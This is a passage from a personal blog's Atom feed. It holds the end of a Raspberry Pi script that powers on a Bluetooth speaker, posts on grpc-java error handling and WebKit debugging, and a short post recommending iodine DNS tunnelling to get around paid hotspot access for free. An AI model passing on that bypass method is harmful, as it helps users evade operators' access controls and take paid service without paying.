&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;! &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;node --version &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;grep -q ${NODE_VER}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;then
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  (&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;cat &amp;#x2F;proc&amp;#x2F;cpuinfo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;grep -q &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Pi Zero&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;[ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;! &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;-d node-v${NODE_VER}-linux-armv6l &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;]&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;then
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;echo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Installing nodejs ${&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;NODE_VER&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;} for armv6 from unofficial builds...&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;curl -O https:&amp;#x2F;&amp;#x2F;unofficial-builds.nodejs.org&amp;#x2F;download&amp;#x2F;release&amp;#x2F;v${NODE_VER}&amp;#x2F;node-v${NODE_VER}-linux-armv6l.tar.xz
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;tar -xf node-v${NODE_VER}-linux-armv6l.tar.xz
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;fi
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;echo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Adding node to the PATH&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;PATH&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;$(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;pwd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;)&amp;#x2F;node-v${&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;NODE_VER&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;}-linux-armv6l&amp;#x2F;bin:${&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;PATH&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;fi
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;After installing NodeJS, run the following script whenever you want to turn your UE Boom on. &amp;lt;strong&amp;gt;Make sure you replace 00:11:22:33:44:55 with your UE Boom’s Bluetooth MAC address, and AABBCCDDEEFF to your Raspberry Pi Zero W’s Bluetooth MAC address, the same client address you used for pairing.&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#!&amp;#x2F;bin&amp;#x2F;sh
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;set &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;-ue
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;HANDLE&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;0x0003
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;VALUE&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;AABBCCDDEEFF01
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;MAC&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;00:11:22:33:44:55
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;gatttool -b $MAC --char-write-req --handle&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$HANDLE --value&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$VALUE
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>Iodine and Paid-Access Hotspot Situations</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-01-19-iodine-and-paid-access-hotspot-situations&#x2F;"/>
                <updated>2019-01-19T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-01-19-iodine-and-paid-access-hotspot-situations&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;I travel a lot and find myself in many situations where I’m connected to a hotspot but have to pay to get access to the Internet.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;If you haven’t heard about &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;code.kryo.se&amp;#x2F;iodine&amp;#x2F;&amp;quot;&amp;gt;iodine&amp;lt;&amp;#x2F;a&amp;gt; yet, it’s a solution that lets you tunnel IP packets over valid DNS requests. This is a solution just for these problems, as most paid-access hotspots allow valid DNS-requests and responses to go through.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;There are many guides on setting up an iodine setup, including &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;demgeeks.com&amp;#x2F;hack-get-free-wifi-on-paid-access-hotspots&amp;#x2F;&amp;quot;&amp;gt;this one&amp;lt;&amp;#x2F;a&amp;gt; for example. The problem is - the established connection is usually too slow to actually do something with it, from my experience.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;iodine lets you SSH into the installed iodine server (over DNS requests&amp;#x2F;responses). Usually people setup an SSH tunnel and use their personal computer regularly.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;If that is too slow for you (like it is for me) - I recommend installing a bunch of utilities &amp;lt;strong&amp;gt;on the server itself&amp;lt;&amp;#x2F;strong&amp;gt; so the server does all massive Internet traffic, and you just get the output through the SSH shell.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;My setup is a cheap $10-a-month DigitalOcean server with the following programs installed:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Reddit client for Terminal - &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;michael-lazar&amp;#x2F;rtv&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;michael-lazar&amp;#x2F;rtv&amp;lt;&amp;#x2F;a&amp;gt;&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Facebook Messenger client for Terminal - &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;mjkaufer&amp;#x2F;Messer&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;mjkaufer&amp;#x2F;Messer&amp;lt;&amp;#x2F;a&amp;gt;&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;Since I installed these I don’t need to create the SSH tunnel anymore, I just run them from the SSH shell and enjoy a relatively fast way of communicating for free.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>Inconsistencies in grpc-java Error Handling with Bidirectional Streams</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2020-10-27-inconsistencies-in-grpc-java-error-handling-with-bidirectional-streams&#x2F;"/>
                <updated>2020-10-27T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2020-10-27-inconsistencies-in-grpc-java-error-handling-with-bidirectional-streams&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;While working on a &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;grpc&amp;#x2F;grpc-java&amp;quot;&amp;gt;grpc-java&amp;lt;&amp;#x2F;a&amp;gt; project with &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;grpc.io&amp;#x2F;docs&amp;#x2F;languages&amp;#x2F;java&amp;#x2F;basics&amp;#x2F;#bidirectional-streaming-rpc&amp;quot;&amp;gt;bidirectional streaming&amp;lt;&amp;#x2F;a&amp;gt; I noticed lack of documentation on how to handle errors. I wanted to know when are errors thrown, and how should an error be handled after receiving one.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Since I could barely find any documentation online, I constructed a few tests of my own. I arranged a small project with a bidirectional gRPC service, and configured &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;junit.org&amp;#x2F;&amp;quot;&amp;gt;JUnit&amp;lt;&amp;#x2F;a&amp;gt; to perform a successful handshake over the loopback between a client and a server before each test. I was using the most recent version of &amp;lt;code&amp;gt;grpc-java&amp;lt;&amp;#x2F;code&amp;gt; (while writing this post) - &amp;lt;code&amp;gt;1.33.0&amp;lt;&amp;#x2F;code&amp;gt;. There are 4 &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; objects in all the tests:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Client Request - Implemented by &amp;lt;code&amp;gt;grpc-java&amp;lt;&amp;#x2F;code&amp;gt;, calling its &amp;lt;code&amp;gt;onNext()&amp;lt;&amp;#x2F;code&amp;gt;, &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;onCompleted()&amp;lt;&amp;#x2F;code&amp;gt; should trigger the appropriate Server Request &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; object over the network.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Client Response - Implemented by me, receiving triggers from Server Response &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; object over the network.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Server Request - Implemented by me, receiving triggers from Client Response &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; object over the network.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Server Response - Implemented by &amp;lt;code&amp;gt;grpc-java&amp;lt;&amp;#x2F;code&amp;gt;, calling its &amp;lt;code&amp;gt;onNext()&amp;lt;&amp;#x2F;code&amp;gt;, &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;onCompleted()&amp;lt;&amp;#x2F;code&amp;gt; should trigger the appropriate Client Response &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; object over the network.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;In the first group of tests - I wanted to check what &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; callbacks are triggered on the &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; objects when I call the 2 different &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; &amp;lt;code&amp;gt;grpc-java&amp;lt;&amp;#x2F;code&amp;gt; implementations. The columns represent the &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; the error was sent on (using &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt;). The rows represent the StreamObserver error was checked on (also, using &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;table&amp;gt;&amp;lt;thead&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&amp;lt;&amp;#x2F;th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;strong&amp;gt;Client Request&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;strong&amp;gt;Server Response&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;th&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;&amp;lt;&amp;#x2F;thead&amp;gt;&amp;lt;tbody&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;Server Request&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;StatusRuntimeException(&amp;quot;CANCELLED: client cancelled&amp;quot;)&amp;lt;&amp;#x2F;code&amp;gt;, &amp;lt;code&amp;gt;cause&amp;lt;&amp;#x2F;code&amp;gt; is &amp;lt;code&amp;gt;null&amp;lt;&amp;#x2F;code&amp;gt;.&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; not triggered&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;Client Response&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;StatusRuntimeException(&amp;quot;CANCELLED: Cancelled by client with StreamObserver.onError()&amp;quot;)&amp;lt;&amp;#x2F;code&amp;gt;, original exception included as &amp;lt;code&amp;gt;cause&amp;lt;&amp;#x2F;code&amp;gt;.&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;StatusRuntimeException(&amp;quot;UNKNOWN&amp;quot;)&amp;lt;&amp;#x2F;code&amp;gt;, &amp;lt;code&amp;gt;cause&amp;lt;&amp;#x2F;code&amp;gt; is &amp;lt;code&amp;gt;null&amp;lt;&amp;#x2F;code&amp;gt;.&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;
&amp;lt;&amp;#x2F;tbody&amp;gt;&amp;lt;&amp;#x2F;table&amp;gt;
&amp;lt;p&amp;gt;(Columns represent the StreamObserver the error was sent on. Rows represent the StreamObserver error was checked on)&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;As you can see - the results are very confusing. Each scenario behaved differently, especially in Server Response &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; object where &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; wasn’t even called when the error was sent from the Server Request object. This proves it is wrong to rely on &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; always being called on both sides when an error is sent.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The test above showed us when and how &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; is being triggered on listening &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; objects. But what can (and should) you do with a such object after receiving an error? Should you call &amp;lt;code&amp;gt;onCompleted()&amp;lt;&amp;#x2F;code&amp;gt; manually? Should you call &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; on the corresponding side of the &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt;?&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;According to &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;grpc.github.io&amp;#x2F;grpc-java&amp;#x2F;javadoc&amp;#x2F;io&amp;#x2F;grpc&amp;#x2F;stub&amp;#x2F;StreamObserver.html&amp;quot;&amp;gt;grpc-java’s StreamObserver documentation&amp;lt;&amp;#x2F;a&amp;gt;, &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;onCompleted()&amp;lt;&amp;#x2F;code&amp;gt; should only be called once and should be the last methods called on an instance. But does that apply if it was called by gRPC over the network? I performed some tests by calling &amp;lt;code&amp;gt;onNext()&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;onComplete()&amp;lt;&amp;#x2F;code&amp;gt; after throwing errors. These are the results:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;table&amp;gt;&amp;lt;thead&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&amp;lt;&amp;#x2F;th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;strong&amp;gt;Client Request&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;strong&amp;gt;Server Response&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;th&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;&amp;lt;&amp;#x2F;thead&amp;gt;&amp;lt;tbody&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;Client Request - onNext&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;IllegalStateException&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;No exception&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;Client Request - onCompleted&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;IllegalStateException&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;No exception&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;Server Response - onNext&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;StatusRuntimeException&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;IllegalStateException&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;Server Response - onCompleted&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;No exception&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;IllegalStateException&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;
&amp;lt;&amp;#x2F;tbody&amp;gt;&amp;lt;&amp;#x2F;table&amp;gt;
&amp;lt;p&amp;gt;(Columns represent the StreamObserver the error was sent on. Rows represent the message sent after the error)&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Once again there are inconsistencies in how gRPC notifies us on the error. It seems like it’s wrong to use the stream after an error was thrown in any way, but only in some cases an exception is thrown back to the caller of &amp;lt;code&amp;gt;onNext()&amp;lt;&amp;#x2F;code&amp;gt; or &amp;lt;code&amp;gt;onCompleted()&amp;lt;&amp;#x2F;code&amp;gt;. I was bothered to see that calling &amp;lt;code&amp;gt;onNext()&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;onCompleted()&amp;lt;&amp;#x2F;code&amp;gt; on a Server Response &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; object after receiving an error from Client Request side didn’t result in the same exception.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;In conclusion, based on the tests I performed it appears that:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Sending errors from the client to the server will always call &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; on all &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; objects, with informative errors. The other way around isn’t as robust.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Streams shouldn’t be used after an error was received, not even to call &amp;lt;code&amp;gt;onCompleted()&amp;lt;&amp;#x2F;code&amp;gt;. gRPC sometimes throws exceptions when calling methods on closed streams.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;The GitHub repository with all of my tests can be found &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;grpc-bidirectional-streaming-error-handling&amp;quot;&amp;gt;here&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>Debugging WebKit for iOS</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-03-16-debugging-webkit-for-ios&#x2F;"/>
                <updated>2019-03-16T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-03-16-debugging-webkit-for-ios&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;I found a &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;bugs.webkit.org&amp;#x2F;show_bug.cgi?id=195537&amp;quot;&amp;gt;bug in WebKit for iOS&amp;lt;&amp;#x2F;a&amp;gt; and wanted to setup a debug environment to find the exact relevant line. This was harder than I thought, so I decided to document the process.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;collect-initial-crash-dump&amp;quot;&amp;gt;Collect Initial Crash Dump&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;I noticed after running the crashing JavaScript code, I got prompted with a &amp;quot;This webpage was reloaded because a problem occurred.&amp;quot; error. I went and checked &amp;lt;em&amp;gt;Settings &amp;amp;gt; Privacy &amp;amp;gt; Analytics &amp;amp;gt; Analytics Data&amp;lt;&amp;#x2F;em&amp;gt; and found a &amp;lt;em&amp;gt;com.apple.WebKit.WebContent&amp;lt;&amp;#x2F;em&amp;gt; entry with the following crash information:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;...
